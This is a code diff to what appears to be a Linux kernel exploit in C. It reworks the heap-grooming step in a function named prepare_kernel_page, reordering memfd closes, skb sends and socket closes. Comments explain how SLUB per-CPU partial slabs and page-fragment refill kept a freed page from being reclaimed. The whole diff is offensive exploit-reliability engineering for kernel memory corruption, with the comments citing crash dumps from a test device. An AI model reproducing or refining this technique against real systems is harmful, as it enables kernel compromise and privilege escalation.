@@ -703,25 +703,54 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     SYSCHK(close(post_ctx.memfds[i]));
     post_ctx.memfds[i] = -1;
   }
-  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
-    SYSCHK(close(spray_ctx.memfds[i]));
-    spray_ctx.memfds[i] = -1;
+  // Each strided close takes one object out of a different full slab, which is
+  // what freezes that slab onto the per-CPU partial list. Doing them here —
+  // before the target slab empties — makes the target the *last* slab frozen,
+  // so nothing ever pushes it back off. CONFIG_SLUB_CPU_PARTIAL is set on
+  // these builds, and a slab that empties while still frozen stays owned by
+  // the cache: it goes straight back out as the next mm_struct instead of
+  // reaching the page allocator, so the reclaim sends cannot win the page no
+  // matter how many of them there are. Measured on tegu, where the panic dumps
+  // had fake_lock + 0x10 reading a live mm_struct's data_vm.
+  if (!RECLAIM_SPRAY_AFTER_LEAK_FREE) {
+    for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
+      SYSCHK(close(spray_ctx.memfds[i]));
+      spray_ctx.memfds[i] = -1;
+    }
   }
 
-  SYSCHK(close(pcp_shaping_sv[0]));
-  SYSCHK(close(pcp_shaping_sv[1]));
+  // The shaping skb pins the current task_frag page. Dropping it here leaves
+  // pfrag->page at refcount 1, and skb_page_frag_refill() answers that by
+  // rewinding pfrag->offset to 0 and handing the same page back instead of
+  // allocating — so the first reclaim send never asks the page allocator for
+  // anything. Keep it queued until the sends are done to force each one to
+  // allocate.
+  if (!RECLAIM_KEEP_PCP_SHAPING) {
+    SYSCHK(close(pcp_shaping_sv[0]));
+    SYSCHK(close(pcp_shaping_sv[1]));
+  }
   sched_yield();
   sched_yield();
   sched_yield();
   sched_yield();
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
+  if (RECLAIM_SPRAY_AFTER_LEAK_FREE) {
+    for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
+      SYSCHK(close(spray_ctx.memfds[i]));
+      spray_ctx.memfds[i] = -1;
+    }
+  }
   for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
     errno = 0;
     ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
     if (sent <= 0) {
       break;
     }
+  }
+  if (RECLAIM_KEEP_PCP_SHAPING) {
+    SYSCHK(close(pcp_shaping_sv[0]));
+    SYSCHK(close(pcp_shaping_sv[1]));
   }
   kernelsnitch_cleanup(ks);
   ks = NULL;
